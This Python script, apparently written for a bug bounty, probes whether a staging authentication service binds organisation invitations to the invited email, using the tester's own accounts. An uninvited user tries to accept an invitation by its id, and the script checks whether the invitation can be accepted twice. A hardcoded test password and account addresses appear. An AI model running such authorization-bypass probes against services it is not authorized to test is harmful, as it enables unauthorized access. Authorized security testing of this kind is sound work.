# -*- coding: utf-8 -*-
"""W4g: invitation binding semantics.
Q1: can a user who is NOT the invited email accept an invitation by id?
Q2: can the same invitation be accepted twice (after one accept)?
U1 owner invites U2; U3 (not invited) tries to accept with that invitation id.
X-Bug-Bounty: xxbo; DB cross-check.
"""
import json
import ssl
import time
import http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
DB_URI = None
LOG = r"F:\scan\neon_report\_w4g_out.txt"
PASS = "SecTest!2026pass"
U1 = "libobo1229+na_org1@gmail.com"
U2 = "libobo1229+na_org2@gmail.com"
U3 = "libobo1229+na_org3@gmail.com"


def out(s):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), s)
    print(line, flush=True)
    with open(LOG, "a", encoding="utf-8") as fh:
        fh.write(line + "\n")


def na(method, path, body=None, cookie=None, timeout=30):
    try:
        ctx = ssl.create_default_context()
        conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
        payload = json.dumps(body) if body is not None else None
        hdrs = {"Content-Type": "application/json", "Origin": "http://localhost:3000",
                "User-Agent": "Mozilla/5.0", "Accept": "application/json",
                "X-Bug-Bounty": "xxbo"}
        if cookie:
            hdrs["Cookie"] = cookie
        conn.request(method, path, body=payload, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        ck = resp.getheader("Set-Cookie", "")
        conn.close()
        time.sleep(0.7)
        return resp.status, data, ck
    except Exception as e:
        time.sleep(0.7)
        return None, str(e)[:150], ""


def auth(email):
    st, data, ck = na("POST", "/neondb/auth/sign-in/email",
                      {"email": email, "password": PASS})
    return ck.split(";")[0] if st in (200, 201) else None


def fetch_db_uri():
    global DB_URI
    ctx = ssl.create_default_context()
    conn = http.client.HTTPSConnection(API_HOST, timeout=30, context=ctx)
    conn.request("GET", API_BASE + "/projects/%s/connection_uri?database_name=neondb"
                 "&role_name=neondb_owner&branch_id=%s" % (PA, PAMAIN),
                 headers={"X-Bug-Bounty": "xxbo", "Authorization": "Bearer " + APIKEY})
    resp = conn.getresponse()
    data = json.loads(resp.read().decode("utf-8", "replace"))
    conn.close()
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    parts = urlsplit(data.get("uri", ""))
    q = [(k, v) for k, v in parse_qsl(parts.query) if k != "channel_binding"]
    DB_URI = urlunsplit((parts.scheme, parts.netloc, parts.path,
                         urlencode(q), parts.fragment))


def dbq(sql):
    import psycopg
    with psycopg.connect(DB_URI, connect_timeout=15) as conn:
        with conn.cursor() as cur:
            cur.execute(sql)
            return cur.fetchall()


def org_members(org):
    return dbq('SELECT m.role, u.email FROM neon_auth.member m JOIN neon_auth.user u '
               'ON u.id=m."userId" WHERE m."organizationId"=%s' % ("'" + org + "'"))


def main():
    out("== W4g invitation binding ==")
    fetch_db_uri()
    c1 = auth(U1)
    c2 = auth(U2)
    c3 = auth(U3)
    out("sessions: %s %s %s" % (bool(c1), bool(c2), bool(c3)))
    st, data, _ = na("POST", "/neondb/auth/organization/create",
                     {"name": "w4g-org", "slug": "w4g-%d" % int(time.time())}, c1)
    org = json.loads(data).get("id") if st == 200 else None
    out("O4 = %s" % org)
    # invite U2 only
    st, data, _ = na("POST", "/neondb/auth/organization/invite-member",
                     {"organizationId": org, "email": U2, "role": "member"}, c1)
    out("invite U2: %s %s" % (st, data[:200]))
    inv_id = json.loads(data).get("id")
    out("invitation id: %s" % inv_id)

    # Q1: U3 (not invited) accepts with the same id
    st, data, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                     {"invitationId": inv_id}, c3)
    out("Q1 U3 accept (not invited): %s %s" % (st, data[:300]))
    out("members after Q1: %s" % org_members(org))

    # Q2: invited U2 accepts same invitation afterwards
    st, data, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                     {"invitationId": inv_id}, c2)
    out("Q2 U2 accept (invited): %s %s" % (st, data[:200]))
    out("members after Q2: %s" % org_members(org))

    # cleanup
    call_st, _, _ = na("POST", "/neondb/auth/organization/delete",
                       {"organizationId": org}, c1)
    out("cleanup: %s" % call_st)
    out("== W4g DONE")


if __name__ == "__main__":
    main()
